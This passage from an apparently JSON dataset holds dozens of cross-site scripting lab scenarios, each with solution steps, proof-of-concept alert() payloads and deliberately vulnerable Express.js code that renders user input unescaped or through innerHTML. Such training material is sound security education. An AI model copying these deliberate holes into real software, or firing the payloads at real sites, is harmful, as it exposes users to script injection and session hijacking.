    "srcCode": "app.get('/dashboard', (req, res) => {\n  const filter = req.query.filter || 'Default';\n  res.send(`\n    <html>\n      <body>\n        <h3>Active Filter: <span id='filt'>${filter}</span></h3>\n        <script>\n          document.getElementById('filt').innerHTML = '${filter}';\n        </script>\n      </body>\n    </html>\n  `);\n});"
  },
  {
    "Lab scenario": "Reflected XSS via Error Logging Endpoint",
    "Lab Description": "A developer debugging panel reflects error messages in real-time using query parameters. When a script fails, the message is passed via the URL and rendered without sanitization into the page. This can be exploited by injecting JavaScript into the `msg` parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access `/log-error?msg=<script>alert(1)</script>`.",
      "Inspect how the message is injected into the DOM (e.g., via innerHTML).",
      "Confirm the JavaScript executes when viewing the error log.",
      "Test variations like <img> and <svg> tags in the parameter."
    ],
    "payloads": [
      "<script>alert('log')</script>",
      "<img src=x onerror=alert('error')>",
      "<svg/onload=alert('debug')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/log-error', (req, res) => {\n  const msg = req.query.msg || 'Unknown error';\n  res.send(`\n    <html>\n      <body>\n        <h2>Error Log:</h2>\n        <div>${msg}</div>\n      </body>\n    </html>\n  `);\n});"
  },
  {
    "Lab scenario": "XSS in Survey Form Builder Preview",
    "Lab Description": "A survey creation tool lets users preview their forms. The form fields are built dynamically from user inputs (question titles, button labels, etc.) and rendered using innerHTML. This exposes the system to XSS if a malicious input is added in the preview stage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a new survey and add a question with `<img src=x onerror=alert(1)>`.",
      "Use the 'Preview Survey' button to load the preview.",
      "Confirm the malicious input is rendered and executed inside the DOM.",
      "Verify the form preview allows full HTML injection without escaping."
    ],
    "payloads": [
      "<script>alert('survey')</script>",
      "<img src=x onerror=alert('form')>",
      "<svg/onload=alert('preview')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet formPreview = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-survey', (req, res) => {\n  formPreview = req.body.question;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Survey Preview</h2>\n        <div>${formPreview}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Admin Report Export Viewer",
    "Lab Description": "An internal admin panel allows exported report files (JSON) to be viewed in the browser. The system parses the JSON and injects the content directly into the page. Malicious entries inside the JSON can lead to XSS if not properly escaped before rendering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a report containing values like `<img src=x onerror=alert(1)>` as field data.",
      "Load the export viewer page and select the uploaded report.",
      "Observe that the report content is injected into a div using innerHTML.",
      "Confirm script execution when the page renders."
    ],
    "payloads": [
      "<script>alert('report')</script>",
      "<img src=x onerror=alert('viewer')>",
      "<svg/onload=alert('admin')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/view-report', (req, res) => {\n  const report = JSON.parse(fs.readFileSync('./data/report.json'));\n  const html = Object.values(report).map(v => `<div>${v}</div>`).join('');\n  res.send(`<html><body><h2>Report</h2>${html}</body></html>`);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS in Email Template Preview with Merge Tags",
    "Lab Description": "A marketing automation platform allows users to build email templates using merge tags like {{user.name}}. When previewing an email, the system renders these values using innerHTML without escaping. If an attacker injects HTML or JavaScript in the name field, it leads to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register an account and set the profile name to `<img src=x onerror=alert(1)>`.",
      "Access the email builder and insert the merge tag `{{user.name}}`.",
      "Click the 'Preview Email' button.",
      "Observe the unescaped rendering of the name in the preview, triggering the payload."
    ],
    "payloads": [
      "<img src=x onerror=alert('merge tag')>",
      "<script>alert('email preview')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet user = { name: '<img src=x onerror=alert(1)>' };\napp.get('/preview', (req, res) => {\n  const emailTemplate = `<h1>Hello {{user.name}}</h1>`;\n  const rendered = emailTemplate.replace('{{user.name}}', user.name);\n  res.send(`<html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Third-Party Widget Configuration Interface",
    "Lab Description": "A SaaS dashboard allows users to embed third-party widgets by providing a custom name and HTML snippet. The snippet is injected into an iframe for rendering, but the widget name is rendered directly in the parent DOM. Improper sanitization of the name field causes a reflected XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure a widget and set its name as `<svg/onload=alert(1)>`.",
      "Navigate to the dashboard view that renders the widget.",
      "Observe that the parent page injects the name via innerHTML.",
      "Confirm that the payload executes when the widget is loaded."
    ],
    "payloads": [
      "<svg/onload=alert('widget')>",
      "<script>alert('iframe parent')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/widget', (req, res) => {\n  const widgetName = req.query.name || 'Default Widget';\n  res.send(`\n    <html>\n      <body>\n        <h2>Now Showing: <span id='title'></span></h2>\n        <iframe src='/widget-content'></iframe>\n        <script>\n          document.getElementById('title').innerHTML = '${widgetName}';\n        </script>\n      </body>\n    </html>\n  `);\n});"
  },
  {
    "Lab scenario": "XSS in AI Chatbot Response Rendering",
    "Lab Description": "An internal HR portal integrates an AI assistant that displays formatted chatbot responses. The backend sends responses as HTML to support formatting. Due to lack of sanitization, specially crafted user questions can poison the output with malicious script, leading to XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a question like `What is <img src=x onerror=alert(1)>?` to the chatbot.",
      "Observe the assistant echoing and formatting your question.",
      "Check that the assistant UI injects this output via `.innerHTML`.",
      "Confirm JavaScript execution in the chat pane."
    ],
    "payloads": [
      "<img src=x onerror=alert('chatbot')>",
      "<script>alert('HR bot')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  const msg = req.query.q || 'Hello';\n  const botReply = `You asked: ${msg}`;\n  res.send(`<html><body><div id='chat'></div>\n    <script>\n      document.getElementById('chat').innerHTML = '${botReply}';\n    </script>\n  </body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Resume Parser Tool for Job Portal",
    "Lab Description": "An online recruitment portal parses resumes and shows key fields (name, title, skills) in a review panel. If a user uploads a resume with a malicious name or skill value, the data is rendered into the DOM via innerHTML during the recruiter review phase.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a fake resume with name or skills like `<img src=x onerror=alert(1)>`.",
      "Upload the resume to the portal.",
      "Login as a recruiter and open the applicant\u00e2\u20ac\u2122s profile.",
      "Observe the XSS triggering on the review panel load."
    ],
    "payloads": [
      "<img src=x onerror=alert('resume')>",
      "<script>alert('job')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/review', (req, res) => {\n  const applicant = { name: '<img src=x onerror=alert(1)>', skill: 'HTML' };\n  res.send(`\n    <html><body>\n      <h3>Candidate: <span>${applicant.name}</span></h3>\n      <p>Skills: <span>${applicant.skill}</span></p>\n    </body></html>\n  `);\n});"
  },
  {
    "Lab scenario": "XSS via Event Tracking Dashboard Tooltip",
    "Lab Description": "An analytics tool shows live user activity on a map. Hovering over a session point displays user-agent and location in a tooltip. If user-agent is not sanitized, a malicious user can inject payloads via browser headers to trigger XSS in the map UI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a request with a User-Agent header like `<img src=x onerror=alert(1)>`.",
      "Trigger an event capture (e.g., login or click).",
      "Visit the analytics dashboard as an admin.",
      "Hover over your recorded session to view the tooltip.",
      "Confirm XSS triggers from tooltip rendering."
    ],
    "payloads": [
      "<img src=x onerror=alert('tooltip')>",
      "<script>alert('UA header')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/track', (req, res) => {\n  const ua = req.headers['user-agent'];\n  sessions.push({ ua });\n  res.send('OK');\n});\n\napp.get('/admin', (req, res) => {\n  const tooltips = sessions.map(s => `<div class='tooltip'>${s.ua}</div>`).join('');\n  res.send(`<html><body>${tooltips}</body></html>`);\n});\n\nconst sessions = [];\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in User Feedback Print Preview Panel",
    "Lab Description": "An internal feedback tool allows managers to print submitted feedback for offline review. When a feedback entry is selected, the system loads it into a print preview modal using innerHTML. Input from users is not sanitized, allowing stored XSS when feedback is rendered for printing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback as a regular user with malicious input like `<img src=x onerror=alert(1)>`.",
      "Login as a manager and open the Print Feedback section.",
      "Click on your submitted entry to load it into the preview.",
      "Confirm that the payload executes in the print preview modal."
    ],
    "payloads": [
      "<img src=x onerror=alert('feedback')>",
      "<script>alert('preview')</script>",
      "<svg/onload=alert('print')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  feedbacks.push(req.body.text);\n  res.send('Submitted');\n});\n\napp.get('/print-preview/:id', (req, res) => {\n  const entry = feedbacks[req.params.id];\n  res.send(`\n    <html><body>\n      <h2>Print Preview</h2>\n      <div id='preview'></div>\n      <script>\n        document.getElementById('preview').innerHTML = '${entry}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Issue Tracker Markdown Preview Panel",
    "Lab Description": "A project management system includes a Markdown editor with a live preview for issue descriptions. The server renders Markdown to HTML without sanitizing raw HTML inside the input, allowing script tags and event handlers to be injected through formatted issue reports.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the new issue form and enter a payload like `<img src=x onerror=alert(1)>` in the description field.",
      "Switch to the 'Preview' tab to see how it renders.",
      "The rendered HTML is inserted directly into the DOM without escaping.",
      "Observe the execution of your XSS payload in the preview panel."
    ],
    "payloads": [
      "<img src=x onerror=alert('markdown')>",
      "<script>alert('preview')</script>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-markdown', (req, res) => {\n  const html = marked(req.body.markdown); // No sanitization\n  res.send(`<html><body><div>${html}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Notification Message Renderer via API Hook",
    "Lab Description": "An internal platform allows third-party services to send messages to a notification widget using a POST API. These messages are shown in the UI using `.innerHTML`. An attacker exploiting an API integration can send malicious HTML that triggers XSS when a user views their notifications.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a POST request to the /send-message endpoint with a payload like `<svg/onload=alert(1)>`.",
      "Access the /dashboard as a logged-in user.",
      "Observe the unsanitized message being rendered into the notification box.",
      "Confirm that the XSS payload executes within the UI."
    ],
    "payloads": [
      "<svg/onload=alert('notification')>",
      "<script>alert('notify')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet messages = [];\napp.use(bodyParser.json());\n\napp.post('/send-message', (req, res) => {\n  messages.push(req.body.text);\n  res.send('Message queued');\n});\n\napp.get('/dashboard', (req, res) => {\n  const rendered = messages.map(m => `<div class='msg'>${m}</div>`).join('');\n  res.send(`<html><body><h2>Notifications</h2>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in E-Commerce Order Notes Renderer",
    "Lab Description": "A back-office admin panel for an e-commerce store allows customers to add order notes. These notes are later displayed to the admin using innerHTML. An attacker can place a payload in the note during checkout that results in stored XSS when the admin views the order.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Place an order with a malicious note like `<img src=x onerror=alert(1)>`.",
      "Login as admin and open the order details page.",
      "The note is shown in a section that renders innerHTML.",
      "Observe that the script executes in the admin's context."
    ],
    "payloads": [
      "<img src=x onerror=alert('order')>",
      "<script>alert('admin view')</script>",
      "<svg/onload=alert('note')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet orders = [{ note: '<img src=x onerror=alert(1)>' }];\n\napp.get('/admin/order/:id', (req, res) => {\n  const note = orders[req.params.id].note;\n  res.send(`<html><body><h3>Customer Note</h3><div>${note}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Chat System Mention Renderer",
    "Lab Description": "A real-time chat system allows users to mention others using @username. Mentions are converted into profile links and displayed via innerHTML in the message thread. If a malicious user sets their username to a payload, it can result in stored XSS when others view the message.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a user with a username like `<img src=x onerror=alert(1)>`.",
      "Send a message mentioning yourself (@<payload>).",
      "When other users open the chat, the mention gets rendered via innerHTML.",
      "Observe the payload triggering on message view."
    ],
    "payloads": [
      "<img src=x onerror=alert('mention')>",
      "<script>alert('chat')</script>",
      "<svg/onload=alert('msg')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet users = [{ username: '<img src=x onerror=alert(1)>' }];\nlet messages = [`@<img src=x onerror=alert(1)> hello`];\n\napp.get('/chat', (req, res) => {\n  const chat = messages.map(msg => `<p>${msg}</p>`).join('');\n  res.send(`<html><body><div>${chat}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Real-Time Task Board via WebSocket Broadcast",
    "Lab Description": "A team collaboration tool uses WebSockets to broadcast real-time task updates. When a task is updated, the title is sent to all clients and rendered using innerHTML in the task board. No input validation is performed, allowing an attacker to send a task update with a script payload that executes on all clients.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Connect to the WebSocket and send a task update containing a payload like `<script>alert(1)</script>`.",
      "All connected clients automatically receive and render the update using innerHTML.",
      "The payload is executed on all connected clients."
    ],
    "payloads": [
      "<script>alert('ws-xss')</script>",
      "<img src=x onerror=alert('realtime')>",
      "<svg/onload=alert('broadcast')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', function connection(ws) {\n  ws.on('message', function incoming(message) {\n    wss.clients.forEach(function each(client) {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(`<div>${message}</div>`);\n      }\n    });\n  });\n});"
  },
  {
    "Lab scenario": "XSS in Drag-and-Drop File Uploader Preview",
    "Lab Description": "A media management app previews filenames uploaded through a drag-and-drop interface. The filenames are directly rendered into the DOM via innerHTML without sanitization. A specially crafted filename with HTML/JS can trigger XSS during preview.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload a file with a malicious name such as `<img src=x onerror=alert(1)>.jpg`.",
      "Observe how the filename is rendered in the UI using innerHTML.",
      "The payload in the filename triggers when the preview is shown."
    ],
    "payloads": [
      "<img src=x onerror=alert('upload')>.jpg",
      "<svg/onload=alert('file')>.png",
      "<script>alert('dropzone')</script>.txt"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const filename = req.file.originalname;\n  res.send(`\n    <html><body>\n      <h2>Uploaded Files</h2>\n      <div id='preview'></div>\n      <script>\n        document.getElementById('preview').innerHTML = '${filename}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Email Template Editor with Dynamic Variables",
    "Lab Description": "An email marketing platform allows users to design templates and preview them with dynamic variables like {{user.name}}. A preview engine substitutes variables with user-provided data and renders the email content with innerHTML. If user data includes malicious HTML, XSS occurs in the preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a test user with the name `<script>alert(1)</script>`.",
      "Use a template like 'Hi {{user.name}}, welcome!'.",
      "Click on 'Preview' and observe the payload execution due to unsafe rendering."
    ],
    "payloads": [
      "<script>alert('template')</script>",
      "<img src=x onerror=alert('preview')>",
      "<svg/onload=alert('dynamic')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet user = { name: '<script>alert(1)</script>' };\nlet template = 'Hi {{user.name}}, welcome!';\n\napp.get('/preview-email', (req, res) => {\n  const rendered = template.replace('{{user.name}}', user.name);\n  res.send(`<html><body><div id='email'>${rendered}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Dynamic Tooltip Library with Data Attributes",
    "Lab Description": "A dashboard uses a tooltip library that reads content from `data-tooltip` attributes and sets it using `.innerHTML` inside a floating div. An attacker can inject HTML content into the `data-tooltip` attribute via an input field, leading to XSS when the user hovers over the element.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit data with a malicious string in a tooltip-bound input.",
      "Hover over the element to trigger the tooltip.",
      "The tooltip engine reads the `data-tooltip` and injects it as innerHTML.",
      "Observe payload execution."
    ],
    "payloads": [
      "\" onmouseover=alert('tooltip') x=\"",
      "\"><svg/onload=alert('hover')>",
      "<img src=x onerror=alert('data-tooltip')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet items = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-item', (req, res) => {\n  items.push(req.body.name);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const content = items.map(i => `<div data-tooltip='${i}'>${i}</div>`).join('');\n  res.send(`<html><body>${content}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Video Player Custom Subtitle Track",
    "Lab Description": "A video streaming platform allows users to upload custom subtitle files which are rendered as captions. When rendering the caption preview, the system uses innerHTML to inject the subtitle line directly into a DOM element. A malicious subtitle line can inject and execute arbitrary scripts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a subtitle file with a line like `<script>alert(1)</script>`.",
      "Load the video and enable the custom subtitle track.",
      "When the line plays, it is injected via innerHTML.",
      "Observe the payload execution."
    ],
    "payloads": [
      "<script>alert('subtitle')</script>",
      "<img src=x onerror=alert('caption')>",
      "<svg/onload=alert('video-xss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet subtitleLine = '<script>alert(1)</script>';\n\napp.get('/video', (req, res) => {\n  res.send(`\n    <html><body>\n      <video src='video.mp4' controls></video>\n      <div id='caption'></div>\n      <script>\n        document.getElementById('caption').innerHTML = '${subtitleLine}';\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in AI Chatbot Summary Feature",
    "Lab Description": "A SaaS application integrates an AI chatbot that summarizes user conversations and stores them in a dashboard. The summary text is rendered using innerHTML for rich formatting. If a malicious input is added to the chat and reflected in the summary, it can trigger XSS in the dashboard view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message containing a payload like `<img src=x onerror=alert(1)>` to the chatbot.",
      "Allow the AI to generate a summary that includes the malicious input.",
      "Open the dashboard where summaries are rendered using innerHTML.",
      "Observe XSS execution."
    ],
    "payloads": [
      "<img src=x onerror=alert('chatbot-xss')>",
      "<svg/onload=alert('summary')>",
      "<script>alert('ai-summary')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet summaries = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chat', (req, res) => {\n  const message = req.body.message;\n  // Simulated summary process\n  const summary = `Summary: ${message}`;\n  summaries.push(summary);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const html = summaries.map(s => `<div class='summary'>${s}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in E-commerce Invoice Note Field",
    "Lab Description": "An e-commerce admin panel allows staff to add internal notes to invoices. These notes are later rendered inside a modal popup using innerHTML when the invoice is viewed. A malicious staff user can inject an XSS payload via the note field, affecting any admin who views the invoice.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an internal note like `<script>alert('invoice')</script>`.",
      "View the invoice as another user or refresh the page.",
      "Observe XSS execution in the modal."
    ],
    "payloads": [
      "<script>alert('invoice')</script>",
      "<img src=x onerror=alert('note')>",
      "<svg/onload=alert('admin-xss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  note = req.body.note;\n  res.redirect('/invoice');\n});\n\napp.get('/invoice', (req, res) => {\n  res.send(`\n    <html><body>\n      <button onclick=\"document.getElementById('modal').style.display='block'\">View Note</button>\n      <div id='modal' style='display:none;'>${note}</div>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Project Management Mention System",
    "Lab Description": "A project management tool allows users to tag teammates using `@username` in comments. Mentions are converted to HTML spans with innerHTML for profile popups. An attacker can bypass mention sanitization by including HTML in their comment, leading to stored XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a comment like `@<img src=x onerror=alert(1)>`.",
      "Mention is converted and rendered using innerHTML.",
      "Visit the task or thread and observe the payload triggering."
    ],
    "payloads": [
      "@<img src=x onerror=alert('mention-xss')>",
      "@<svg/onload=alert('project')>",
      "@<script>alert('tag')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/task');\n});\n\napp.get('/task', (req, res) => {\n  const rendered = comments.map(c => `<div>${c.replace(/@([a-zA-Z0-9]+)/g, '<span class=\"mention\">@$1</span>')}</div>`).join('');\n  res.send(`<html><body>${rendered}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in LMS Code Submission Feedback Section",
    "Lab Description": "A Learning Management System (LMS) lets students submit code assignments and receive feedback. Instructor comments are shown next to the code using innerHTML. If an instructor accidentally includes unsafe HTML or JavaScript in the feedback, XSS can be triggered when students view it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an assignment and trigger feedback with `<script>alert(1)</script>`.",
      "Open the feedback section as a student.",
      "Observe the execution of the malicious feedback."
    ],
    "payloads": [
      "<script>alert('lms')</script>",
      "<img src=x onerror=alert('feedback')>",
      "<svg/onload=alert('submission-xss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet feedback = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  feedback = req.body.comment;\n  res.redirect('/submission');\n});\n\napp.get('/submission', (req, res) => {\n  res.send(`<html><body><h3>Your Feedback</h3><div>${feedback}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Collaborative Markdown Editor with Preview",
    "Lab Description": "A collaborative documentation tool uses a Markdown editor and allows users to preview the rendered HTML. The Markdown engine fails to sanitize raw HTML tags, so a user can insert `<script>` tags directly. When another collaborator opens the preview, XSS is triggered.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Insert raw HTML like `<script>alert(1)</script>` into a Markdown note.",
      "Click on 'Preview' or share the note with another user.",
      "Observe execution of the script in the rendered preview."
    ],
    "payloads": [
      "<script>alert('markdown')</script>",
      "<img src=x onerror=alert('doc-preview')>",
      "<svg/onload=alert('collab-xss')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst marked = require('marked');\nconst app = express();\n\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save', (req, res) => {\n  note = req.body.md;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  const html = marked(note);\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Custom CRM Search Autocomplete",
    "Lab Description": "A custom-built CRM system includes a search bar with autocomplete suggestions for contacts. The suggestions are injected via JavaScript into the DOM without proper sanitization. An attacker can inject malicious scripts via a contact\u00e2\u20ac\u2122s name, which is then shown as part of the autocomplete dropdown.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a contact with a name containing a payload like `<img src=x onerror=alert(1)>`.",
      "Start typing the contact name in the CRM search bar.",
      "Observe XSS triggered in the autocomplete suggestion."
    ],
    "payloads": [
      "<img src=x onerror=alert('crm-xss')>",
      "<svg/onload=alert('autocomplete')>",
      "<script>alert('search')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet contacts = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-contact', (req, res) => {\n  contacts.push(req.body.name);\n  res.redirect('/search');\n});\n\napp.get('/search', (req, res) => {\n  const script = `\n    <script>\n      const data = ${JSON.stringify(contacts)};\n      document.addEventListener('DOMContentLoaded', () => {\n        const box = document.getElementById('suggestions');\n        box.innerHTML = data.map(d => '<div>' + d + '</div>').join('');\n      });\n    </script>`;\n  res.send(`<html><body><input type='text' /><div id='suggestions'></div>${script}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in SaaS Admin Analytics Embed Tool",
    "Lab Description": "A SaaS platform allows admins to embed custom analytics widgets using raw HTML snippets. These snippets are stored and injected into the dashboard. If an attacker saves a malicious script in the embed HTML, it will execute when the dashboard loads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to the analytics embed settings and add a payload like `<script>alert(1)</script>`.",
      "Visit the dashboard where the widget renders.",
      "Observe XSS execution from the embedded content."
    ],
    "payloads": [
      "<script>alert('embed-xss')</script>",
      "<img src=x onerror=alert('widget')>",
      "<svg/onload=alert('dashboard')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet widgetHTML = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/save-widget', (req, res) => {\n  widgetHTML = req.body.html;\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send(`<html><body><h3>Analytics</h3>${widgetHTML}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Mobile Push Notification Preview",
    "Lab Description": "An admin interface for sending mobile push notifications displays a preview before sending. The message is rendered using innerHTML to simulate what users would see. If the admin inserts an HTML payload, it executes in the preview, causing an XSS vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a notification message with `<img src=x onerror=alert(1)>`.",
      "Click 'Preview' in the push notification interface.",
      "Observe the script execution in the preview section."
    ],
    "payloads": [
      "<img src=x onerror=alert('push-xss')>",
      "<svg/onload=alert('preview')>",
      "<script>alert('mobile')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet preview = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/preview', (req, res) => {\n  preview = req.body.message;\n  res.redirect('/push');\n});\n\napp.get('/push', (req, res) => {\n  res.send(`<html><body><h4>Notification Preview</h4><div>${preview}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Email Template Test Renderer",
    "Lab Description": "A web platform lets users build and preview email templates. When testing, the email content is rendered using innerHTML to simulate appearance. If malicious HTML is added to the content body, it results in XSS during the test render.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create an email template with `<svg/onload=alert(1)>`.",
      "Open the test render preview.",
      "Observe script execution from the malicious input."
    ],
    "payloads": [
      "<svg/onload=alert('email-xss')>",
      "<img src=x onerror=alert('template')>",
      "<script>alert('render')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet emailBody = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/template', (req, res) => {\n  emailBody = req.body.body;\n  res.redirect('/test-email');\n});\n\napp.get('/test-email', (req, res) => {\n  res.send(`<html><body><div>${emailBody}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Product Customizer Live Preview",
    "Lab Description": "An online merchandise store includes a live preview feature for customizing t-shirts with text. The text input is rendered into the preview using innerHTML. Injecting HTML tags in the input results in XSS execution during live preview rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter a custom text such as `<script>alert(1)</script>`.",
      "Observe the text rendered on the t-shirt preview area.",
      "The script is executed when the DOM renders the input."
    ],
    "payloads": [
      "<script>alert('preview-xss')</script>",
      "<img src=x onerror=alert('customizer')>",
      "<svg/onload=alert('shirt')>"
    ],
    "Vulnerability name": "Cross-site scripting",
